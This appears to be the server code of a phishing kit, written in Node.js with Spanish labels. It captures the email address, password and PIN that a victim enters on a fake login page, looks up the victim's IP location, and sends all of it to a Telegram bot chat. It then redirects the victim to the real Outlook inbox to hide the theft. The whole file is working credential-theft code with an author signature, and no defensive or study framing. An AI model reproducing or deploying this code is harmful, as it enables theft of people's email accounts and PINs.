const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.static('public'));
app.use(bodyParser.urlencoded({ extended: true }));

app.post('/login', async (req, res) => {
  const { uzer, pazz, p1n } = req.body;

  let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || '';
  if (ip.includes(',')) ip = ip.split(',')[0].trim();
  if (ip.includes("::ffff:")) ip = ip.split("::ffff:")[1];

  const privateIpRanges = [
    /^10\./, /^192\.168\./, /^172\.(1[6-9]|2[0-9]|3[0-1])\./, /^127\./, /^::1$/,
  ];
  if (privateIpRanges.some(regex => regex.test(ip))) {
    ip = 'IP privada o no pública';
  }

  let location = '';
  if (ip === 'IP privada o no pública') {
    location = 'Ubicación no disponible';
  } else {
    try {
      const response = await fetch(`http://ip-api.com/json/${ip}`);
      const data = await response.json();
      location = data.status === 'success'
        ? `${data.city || 'Ciudad desconocida'}, ${data.countryCode || 'XX'}`
        : 'Ubicación desconocida';
    } catch {
      location = 'Ubicación desconocida';
    }
  }

  const message = `📧EMAIL: ${uzer}
🔒Cl4v3: ${pazz}
📌P1N: ${p1n}
IP: ${ip}

${location}

C0DE BY 4DFC TRAMP$$ 👨🏻‍💻🥷🏻`;

  const url = `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text: message }),
    });

    res.redirect('https://outlook.live.com/mail/0');
  } catch (error) {
    console.error('Error enviando a Telegram:', error);
    res.status(500).send('Error al enviar mensaje');
  }
});

app.listen(PORT, () => {
  console.log(`Servidor corriendo en http://localhost:${PORT}`);
});
